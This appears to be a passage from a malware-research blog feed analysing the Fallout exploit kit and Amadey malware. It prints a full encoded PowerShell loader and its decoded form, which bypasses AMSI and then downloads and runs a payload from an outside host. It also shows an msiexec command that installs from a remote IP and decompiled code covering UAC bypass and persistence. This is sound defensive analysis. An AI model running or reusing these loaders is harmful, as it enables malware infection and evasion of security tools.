<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-w</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="nt">-noni</span><span class="w"> </span><span class="nt">-enc</span><span class="w"> </span><span class="nx">dAByAHkAewAkAGwAMQBJAGwAMQA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQA7ACQAbAAxAEkAbAAxAGwASQAxAEkASQBsAD0AJABsADEASQBsADEALgBHAGUAdABUAHkAcABlACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFUAMwBsAHoAZABHAFYAdABMAGsAMQBoAGIAbQBGAG4AWgBXADEAbABiAG4AUQB1AFEAWABWADAAYgAyADEAaABkAEcAbAB2AGIAaQA1AEIAYgBYAE4AcABWAFgAUgBwAGIASABNAD0AJwApACkAKQA7ACQASQAxAEkAbAAxADEAbAAxAEkAbAA9ACQAbAAxAEkAbAAxAGwASQAxAEkASQBsAC4ARwBlAHQARgBpAGUAbABkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAFkAVwAxAHoAYQBVAGwAdQBhAFgAUgBHAFkAVwBsAHMAWgBXAFEAPQAnACkAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAkAEkAMQBJAGwAMQAxAGwAMQBJAGwALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AH0AYwBhAHQAYwBoAHsAfQA7AEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAIgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzADsAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwAKQBdAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABJADEAbABJAEkAMQBJAGwAMQB7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAEkAbABJADEAOwBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAbABJAGwAMQBJADEASQBJADEAbAA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkASQBJAEkASQBsAEkASQA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkAbAAxADEAMQBsAEkAbAAxAEkAMQBJADsAfQBbAFMAdAByAHUAYwB0AEwAYQB5AG8AdQB0ACgATABhAHkAbwB1AHQASwBpAG4AZAAuAFMAZQBxAHUAZQBuAHQAaQBhAGwALABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdAHAAdQBiAGwAaQBjACAAcwB0AHIAdQBjAHQAIABsAEkAMQBsAGwAMQBJAGwAMQBJADEAbAB7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkASQBJAGwASQA7AHAAdQBiAGwAaQBjACAAcwB0AHIAaQBuAGcAIABJAGwAMQBsADEAOwBwAHUAYgBsAGkAYwAgAHMAdAByAGkAbgBnACAAbABJADEAbABsADsAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAEkAbAAxADEAMQBJAEkASQBsADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAASQAxAGwASQBsADEAbABsADEASQA7AHAAdQBiAGwAaQBjACAAdQBpAG4AdAAgAEkAbABJAEkASQBsADEAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABsAGwAMQAxAEkAbABsADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAASQBsADEASQBsAEkAbAAxADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAbABJAGwASQBJAEkAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABsAEkAMQBsAEkAbABJADsAcAB1AGIAbABpAGMAIAB1AGkAbgB0ACAAbABJADEAbAAxADEAOwBwAHUAYgBsAGkAYwAgAHUAaQBuAHQAIABJAGwAbAAxAEkAbAA7AHAAdQBiAGwAaQBjACAAcwBoAG8AcgB0ACAASQBsAEkASQAxADsAcAB1AGIAbABpAGMAIABzAGgAbwByAHQAIABJAGwAbABJAGwAbAA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABsAGwASQBsAEkAbABJAGwASQA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAGwAbAAxAEkAbABJAGwASQA7AHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABJAGwAbABJAGwAbABsAEkAMQBJADEAOwBwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAASQAxAEkASQBJADsAfQA7AHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABjAGwAYQBzAHMAIABsADEASQBsADEAMQBJAEkASQB7AFsARABsAGwASQBtAHAAbwByAHQAKAAiACIAawBlAHIAbgBlAGwAMwAyAC4AZABsAGwAIgAiACwAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwAoAHMAdAByAGkAbgBnACAASQBJAGwASQBJAEkALABzAHQAcgBpAG4AZwAgAEkAbABJAGwASQAsAEkAbgB0AFAAdAByACAASQAxADEAbAAxAEkALABJAG4AdABQAHQAcgAgAGwAMQBsAEkAMQAsAGIAbwBvAGwAIABJAGwASQAxADEASQBJADEAMQAxADEALAB1AGkAbgB0ACAAbAAxADEAMQBJACwASQBuAHQAUAB0AHIAIABsAEkASQBJADEASQBsAGwASQAsAHMAdAByAGkAbgBnACAASQAxAEkAbAAxAGwASQAsAHIAZQBmACAAbABJADEAbABsADEASQBsADEASQAxAGwAIABsAGwAMQAxAEkASQBsADEASQAsAG8AdQB0ACAASQAxAGwASQBJADEASQBsADEAIABsAEkASQAxAEkASQApADsAfQAiADsAJABsAGwAbAAxAEkAbABsAEkAMQA9ACIAJABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwATABvAHcAXAAkACgALQBqAG8AaQBuACgAKAA0ADgALgAuADUANwApACsAKAA2ADUALgAuADkAMAApACsAKAA5ADcALgAuADEAMgAyACkAfABHAGUAdAAtAFIAYQBuAGQAbwBtACAALQBDAG8AdQBuAHQAIAA4AHwAJQB7AFsAYwBoAGEAcgBdACQAXwB9ACkAKQAuAHQAbQBwACIAOwAkAEkAMQBsADEAMQBJADEAPQAnAGgAdAB0AHAAOgAvAC8AYgBlAGEAaABlAHIAbwA0AHUALgBjAG8AbQAvADEAOQA1ADAALQAwADEALQAxADEALwBPADgAWgByACcAOwBbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcASgBHAE4AcwBhAFQAMABvAFQAbQBWADMATABVADkAaQBhAG0AVgBqAGQAQwBCAE8AWgBYAFEAdQBWADIAVgBpAFEAMgB4AHAAWgBXADUAMABLAFQAcwBrAFkAMgB4AHAATABrAGgAbABZAFcAUgBsAGMAbgBOAGIASgAxAFYAegBaAFgASQB0AFEAVwBkAGwAYgBuAFEAbgBYAFQAMABuAFMAagBVADMAVQBEAGwANQBNAFcAawB6AE0ARQAwAHgATQBEAEoAWQBOAFMAYwA3AEoARwBOAHMAYQBTADUARQBiADMAZAB1AGIARwA5AGgAWgBFAFoAcABiAEcAVQBvAEoARQBrAHgAYgBEAEUAeABTAFQARQBzAEoARwB4AHMAYgBEAEYASgBiAEcAeABKAE0AUwBrADcAJwApACkAfABpAGUAeAA7ACQASQAxAEkAMQBsADEASQBJAGwAbABJADEAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbABJADEAbABsADEASQBsADEASQAxAGwAOwAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxAC4ASQBsAEkASQAxAD0AMAB4ADAAOwAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxAC4ASQBJAEkAbABJAD0AWwBTAHkAcwB0AGUAbQAuAFIAdQBuAHQAaQBtAGUALgBJAG4AdABlAHIAbwBwAFMAZQByAHYAaQBjAGUAcwAuAE0AYQByAHMAaABhAGwAXQA6ADoAUwBpAHoAZQBPAGYAKAAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxACkAOwAkAEkASQBsADEASQBsADEASQA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJADEAbABJAEkAMQBJAGwAMQA7AFsAbAAxAEkAbAAxADEASQBJAEkAXQA6ADoAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwAoACQAbABsAGwAMQBJAGwAbABJADEALAAkAGwAbABsADEASQBsAGwASQAxACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAJABmAGEAbABzAGUALAAwAHgAMAAwADAAMAAwADAAMAA4ACwAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvACwAIgBjADoAIgAsAFsAcgBlAGYAXQAkAEkAMQBJADEAbAAxAEkASQBsAGwASQAxACwAWwByAGUAZgBdACQASQBJAGwAMQBJAGwAMQBJACkAfABvAHUAdAAtAG4AdQBsAGwAOwA</span><span class="o">=</span><span class="w">
</span></code></pre></div></div>

<p>Let’s decode and clean.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">try</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nv">$l1Il1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="p">;</span><span class="w">
    </span><span class="nv">$l1Il1lI1IIl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$l1Il1</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s2">"System.Management.Automation.AmsiUtils"</span><span class="p">);</span><span class="w">
    </span><span class="nv">$I1Il11l1Il</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$l1Il1lI1IIl</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s2">"amsiInitFailed"</span><span class="p">,</span><span class="w"> </span><span class="s1">'NonPublic,Static'</span><span class="p">);</span><span class="w">
    </span><span class="nv">$I1Il11l1Il</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="w"> </span><span class="bp">$true</span><span class="p">);</span><span class="w">
</span><span class="p">}</span><span class="w">
</span><span class="kr">catch</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">};</span><span class="w">

</span><span class="n">Add-Type</span><span class="w"> </span><span class="nt">-TypeDefinition</span><span class="w"> </span><span class="s2">"using System;using System.Diagnostics;using System.Runtime.InteropServices;[StructLayout(LayoutKind.Sequential)]public struct I1lII1Il1{public IntPtr IIlI1;public IntPtr lIl1I1II1l;public uint IIIIIlII;public uint Il111lIl1I1I;}[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]public struct lI1ll1Il1I1l{public uint IIIlI;public string Il1l1;public string lI1ll;public string Il111IIIl;public uint I1lIl1ll1I;public uint IlIIIl1;public uint ll11Ill;public uint Il1IlIl1;public uint lIlIII;public uint lI1lIlI;public uint lI1l11;public uint Ill1Il;public short IlII1;public short IllIll;public IntPtr llIlIlIlI;public IntPtr Ill1IlIlI;public IntPtr IllIlllI1I1;public IntPtr I1III;};public static class l1Il11III{[DllImport(""kernel32.dll"",SetLastError=true)]public static extern bool CreateProcess(string IIlIII,string IlIlI,IntPtr I11l1I,IntPtr l1lI1,bool IlI11II1111,uint l111I,IntPtr lIII1IllI,string I1Il1lI,ref lI1ll1Il1I1l ll11IIl1I,out I1lII1Il1 lII1II);}"</span><span class="p">;</span><span class="w">

</span><span class="nv">$lll1IllI1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">userprofile</span><span class="s2">\AppData\LocalLow\</span><span class="si">$(</span><span class="o">-join</span><span class="p">((</span><span class="mi">48</span><span class="o">..</span><span class="mi">57</span><span class="si">)</span><span class="s2">+(65..90)+(97..122)|Get-Random -Count 8|%{[char]</span><span class="bp">$_</span><span class="s2">})).tmp"</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1l11I1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'http://beahero4u.com/1950-01-11/O8Zr'</span><span class="p">;</span><span class="w">
</span><span class="nv">$cli</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">);</span><span class="w">
</span><span class="nv">$cli</span><span class="o">.</span><span class="n">Headers</span><span class="p">[</span><span class="s1">'User-Agent'</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'J57P9y1i30M102X5'</span><span class="p">;</span><span class="w">
</span><span class="nv">$cli</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="nv">$I1l11I1</span><span class="p">,</span><span class="w"> </span><span class="nv">$lll1IllI1</span><span class="p">);</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">lI1ll1Il1I1l</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="o">.</span><span class="nf">IlII1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="n">x0</span><span class="p">;</span><span class="w">
</span><span class="nv">$I1I1l1IIllI1</span><span class="o">.</span><span class="nf">IIIlI</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">SizeOf</span><span class="p">(</span><span class="nv">$I1I1l1IIllI1</span><span class="p">);</span><span class="w">
</span><span class="nv">$IIl1Il1I</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">I1lII1Il1</span><span class="p">;</span><span class="w">
</span><span class="p">[</span><span class="n">l1Il11III</span><span class="p">]::</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nv">$lll1IllI1</span><span class="p">,</span><span class="w"> </span><span class="nv">$lll1IllI1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="n">Zero</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">,</span><span class="w"> </span><span class="nx">0x00000008</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">IntPtr</span><span class="p">]::</span><span class="nx">Zero</span><span class="p">,</span><span class="w"> </span><span class="s2">"c:"</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$I1I1l1IIllI1</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$IIl1Il1I</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">out-null</span><span class="p">;</span><span class="w">
</span></code></pre></div></div>

<p>Thus the malware is downloaded and executed.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Fallout has been heavily updated, making analysis very difficult. Very sophisticated techniques such as Diffie-Hellman key exchange, VM detection, process detection, etc. are used. We need to be careful as they may be updated in the future.</p>
]]></content:encoded>
<pubDate>2019-07-09T15:00:00+00:00</pubDate>
</item>
<item>
<title>Analyzing Amadey</title>
<link>http://nao-sec.org/2019/04/Analyzing-amadey.html</link>
<guid>http://nao-sec.org/2019/04/Analyzing-amadey.html</guid>
<content:encoded><![CDATA[
<h2 id="initial-access">Initial Access</h2>

<p>Amedey is installed by msiexec.exe when you open a malicious excel file.
From the document file technique, the threat actor is considered TA505.</p>

<ul>
  <li><a href="https://ti.360.net/blog/articles/excel-4.0-macro-utilized-by-ta505-to-target-financial-institutions-recently-en/">Excel 4.0 Macro Utilized by TA505 to Target Financial Institutions Recently</a></li>
  <li><a href="https://www.cybereason.com/blog/threat-actor-ta505-targets-financial-enterprises-using-lolbins-and-a-new-backdoor-malware">Threat Actor TA505 Targets Financial Enterprises Using LOLBins and a New Backdoor Malware</a></li>
</ul>

<p><img src="https://nao-sec.org/assets/2019-04-28/01.jpg" width="100%" />
https://app.any.run/tasks/3430e711-7bb1-49b4-ac07-86b1a6b5c784</p>

<p>The download URL is as follows:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msiexec.exe STOP=1 /i http://109.234.38.177/dom4 /q ksw='%TEMP%'
</code></pre></div></div>

<h2 id="first-payload">First payload</h2>

<p>First payload is packed.
Extract the original PE using the hollows_hunter mode of tknk_scanner.</p>

<p><img src="https://nao-sec.org/assets/2019-04-28/02.jpg" width="100%" /></p>

<h2 id="amadey">Amadey</h2>

<p>The dumped PE is compiled with MinGW.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PE: compiler: MinGW(-)[-]
PE: linker: GNU linker ld (GNU Binutils)(2.56*)[EXE32]
</code></pre></div></div>

<p>It contains symbol information.
Amedey has the following functions:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>_Z10aBypassUACv    
_Z10aCharToIntPc
_Z10aGetOsArchv    
_Z10aIntToChari    
_Z11aAutoRunSetPc
_Z11aCheckAdminv    
_Z11aCreateFilePc    
_Z11aFileExistsPKc    
_Z11aGetTempDirv    
_Z11aProcessDllPcS_
_Z11aProcessExePcS_S_S_    
_Z11aRunAsAdminPc    
_Z12aGetHostNamev    
_Z12aGetSelfPathv    
_Z12aGetUserNamev    
_Z12aProcessTaskPc    
_Z12aResolveHostPc    
_Z12aWinSockPostPcS_S_
_Z13aDropToSystemPc    
_Z13aGetProcessILv    
_Z14aCreateProcessPc    
_Z14aGetProgramDirv    
_Z15aUrlMonDownloadPcS_    
_Z16aDirectoryExistsPc    
_Z16aExtractFileNamePc    
_Z16aGetHomeDriveDirv    
_Z16aProcessDllLocalPcS_S_S_    
_Z16aProcessExeLocalPcS_S_S_    
_Z19aGetSelfDestinationi    
_Z5aCopyPcii    
_Z5aParsPcS_    
_Z6aBasici    
_Z6aGetIdv    
_Z6aGetOsv    
_Z6aMkDirPc    
_Z7aPathAVPc    
_Z7aRaportPcS_    
_Z8aCheckAVv    
_Z8aDecryptPc    
_Z8aPosLastPcS_    
_Z9aCopyFilePcS_    
_Z9aFileSizePc    
_Z9aFillCharPc    
_Z9aFreeFilePc    
_Z9aPosFirstPcS_    
_Z9aRunDll32PcS_
</code></pre></div></div>

<p>The main function is as follows.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">_Argc</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">_Argv</span><span class="p">,</span><span class="kt">char</span> <span class="o">**</span><span class="n">_Env</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">pcVar1</span><span class="p">;</span>
  
                    <span class="cm">/* 0x3ac8  97  main */</span>
  <span class="n">FUN_00404020</span><span class="p">();</span>
  <span class="n">FUN_00403cc0</span><span class="p">();</span>
  <span class="n">_Z10aBypassUACv</span><span class="p">();</span>
  <span class="n">pcVar1</span> <span class="o">=</span> <span class="n">_Z12aGetSelfPathv</span><span class="p">();</span>
  <span class="n">_Z13aDropToSystemPc</span><span class="p">(</span><span class="n">pcVar1</span><span class="p">);</span>
  <span class="n">pcVar1</span> <span class="o">=</span> <span class="n">_Z19aGetSelfDestinationi</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">_Z11aAutoRunSetPc</span><span class="p">(</span><span class="n">pcVar1</span><span class="p">);</span>
  <span class="n">_Z6aBasici</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The _Z6aBasici function is as follows.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */</span>

<span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">_Z6aBasici</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_1</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_Source</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">uVar1</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
  
                    <span class="cm">/* 0x33fe  32  _Z6aBasici */</span>
  <span class="n">FUN_00404020</span><span class="p">();</span>
  <span class="n">_Z9aFillCharPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">);</span>
  <span class="n">_Z9aFillCharPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffddf4</span><span class="p">);</span>
  <span class="n">_Z9aFillCharPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffdbf4</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aDomain</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffddf4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aScript</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffdbf4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aParam0</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z6aGetIdv</span><span class="p">();</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aParam1</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aVers</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">uVar1</span> <span class="o">=</span> <span class="n">_Z11aCheckAdminv</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">uVar1</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aParam2</span><span class="p">);</span>
    <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
    <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="s">"1"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aParam2</span><span class="p">);</span>
    <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
    <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="s">"0"</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aParam3</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z10aGetOsArchv</span><span class="p">();</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aParam4</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z10aIntToChari</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aParam5</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">iVar2</span> <span class="o">=</span> <span class="n">_Z6aGetOsv</span><span class="p">();</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z10aIntToChari</span><span class="p">(</span><span class="n">iVar2</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aParam6</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">uVar1</span> <span class="o">=</span> <span class="n">_Z8aCheckAVv</span><span class="p">();</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z10aIntToChari</span><span class="p">(</span><span class="n">uVar1</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aParam7</span><span class="p">);</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z12aGetHostNamev</span><span class="p">();</span>
  <span class="n">strcat</span><span class="p">(</span><span class="o">&amp;</span><span class="n">stack0xffffeff4</span><span class="p">,</span><span class="n">_Source</span><span class="p">);</span>
  <span class="n">_Source</span> <span class="o">=</span> <span class="n">_Z8aDecryptPc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">aParam8</span><span class="p">);</span>
